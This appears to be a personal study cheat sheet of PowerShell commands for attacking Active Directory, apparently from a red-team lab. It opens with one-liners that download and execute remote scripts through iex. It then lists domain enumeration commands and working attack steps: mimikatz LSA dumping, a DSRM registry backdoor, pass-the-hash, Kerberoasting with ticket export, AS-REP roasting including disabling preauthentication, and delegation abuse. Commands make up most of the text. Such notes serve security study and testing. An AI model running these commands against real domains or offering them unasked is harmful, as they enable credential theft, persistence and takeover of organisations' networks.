## run remote scripts

```
$wr = [system.net.webrequest]::create('<uri>')
$r = $wr.getresponse()
iex ([system.io.streamreader]($r.getresponsestream())).readtoend()
```

```
iex (new-object net.webclient).downloadstring('<uri>')
iex (iwr '<uri>') // invoke-webrequest - iwr
``` 

## get computers in a domain

Powerview
```
get-netcomputer
get-netcomputer -fulldata
get-netcomputer -fulldata | where-object {$_.name -eq "dcorp-std41"}
get-netcomputer -fulldata -name "dcorp-std41"
get-netcomputer -operatingsystem "*server 2016*"
```

admodule
```
get-adcomputer -filter *
get-adcomputer -filter * | select dnshostname
get-adcomputer -identity "dcorp-std41" -properties *
```

## get groups

Powerview
```
get-netgroup
get-netgroup -domain <domain>
get-netgroup -fulldata
get-netgroup 'domain admins' -fulldata  | select member
get-netgroup "*admin*"
```

admodule
```
get-adgroup -identity 'domain admins'
get-adgroup -filter * -properties *
get-adgroup -filter 'name -like "*admin*"'
```

## get group members

Powerview
```
get-netgroupmember -groupname "domain admins"
```

## get GPO

Powerview
```
get-netgpo
get-netgpo | select displayname
get-netgpo -computername "<computer name>" | select displayname - this gives the GP applied on a particular computer
gpresult /r
get-netgrogroup - groups(which are pushed through group policy) that are part of a local group on a machine
find-gpocomputeradmin -computername <cname> - find users who are part(pushed by GP) of localgroups
find-gpolocation -username student35 -verbose - find machines where user is part(pushed by GP) of a local group
```

## ACL

Access token: contains the permissions of the process that is trying to access a domian object, i.e groups of the process owner, permissions of the process owner etc
SEcurity Descriptor: this is for the domain object - contains SID of the object owner, DACL (represents who have access to this obejct), SACL (audit policy of the object)

## persistence

### golden ticket, silver ticket

### Skeleton key

mimikatz as password

### DSRM password

```
invoke-mimikatz -command '"lsadump::lsa /patch"' -- on the DC -- this will give us the local administrator password
```

now we need to login into DC with this password, for this to work, we need to set a registry property =>

```
new-itemproperty "hklm:\system\currentcontrolset\control\lsa\" -name "dsrmadminlogonbehaviour" -value 2 -propertytype dword
```

if the property already exists, just set it to 2 => setting this HKLM properties might cause some alerts ? if not we should set up alerts for this

after doing this property setting, we need to login, (note the domain, thats how it should be)

```
invoke-mimikatz -command '"sekurlsa::pth /domain:dcorp-dc /user:Administrator /ntlm:hash /run:powershell.exe"'
```

`ls \\dcorp-dc\c$` => we can access the FS as localadmin, but probably cant login with enter-pssession (as this tries to use kerberos auth and we're doing only local admin)

### persistence using ACL

## Kerberoast

- basically requesting for a TGS and cracking the TGS NTLM hash
- can't do this for usual machine accounts because their passwords are created by machines - which are very complex
- logs perspective - only 4769 - kerberos ticket requested
- so, here we're targeting user accounts which are being used as service accounts
- if the property 'ServicePrincipalName' is set on a user account - then its being used as service account
- as long as you have a valid user account, you can request a TGS - which is why you need an account to do impacket-getuserspns

finding out which users have the SPN param
```
Get-NetUser -SPN
get-aduser -filter {serviceprincipalname -ne "$null"} -properties serviceprincipalname
```

requesting a TGS
```
add-type -assemblyname system.identitymodel
new-object system.identitymodel.tokens.kerberosrequestorsecuritytoken -argumentlist "mssqlsvc/dcorp-mgmt.dollarcorp.moneycorp.local"

# this can be checked by doing klist - this is apparently saved in memory, can be saved to file using Mimikatz

invoke-mimikatz -command '"kerberos::list /export"'

# using powerview - we can directly use hashcat in this case
request-spnticket
```

setting SPN and do kerberoas
```
set-domainobject -identity <username> -set @{serviceprincipalname='zzzzz/whatever'}
```

## AS-REP Roast

- AS-REP roast -- 'Do not require Kerberos Pre Auth' - this means that user can request TGT without UN/PW - which means we can crack the TGT

get users with preauthnotrequired
```
# Powerview
get-domainuser -preauthnotrequired -verbose

Get-aduser -filter {doesnotrequirepreauth -eq $true} -properties doesnotrequirepreauth
```

disable preauth on a user - if you have that permission over an user
```
set-domainobject -identity <user> -xor @{useraccountcontrol=4194304} -verbose
```

invoke asreproast
```
# asreproast.ps1
get-asrephash -username <user> -verbose

invoke-asreproast -verbose
```

## unconstrained delegation

```
get-netcomputer -unconstrained
sekurlsa::tickets / invoke-mimikatz -command '"sekurlsa::tickets"' -- checks for any kerberos tickets that are saved in lsass
```

## constrained delegation

- trusted to auth for delegation on the account - TRUSTED_TO_AUTH_FOR_DELEGATION
- constrained delegation allows the service account to request for TGT / TGS on behalf of 'ANY' user

```
# powerview dev
get-domainuser -trustedtoauth
get-domaincomputer -trustedtoauth

# ad module
get-adobject -filter {msds-allowedtodelegateto -ne "$null"} -properties msds-allowedtodelegateto
```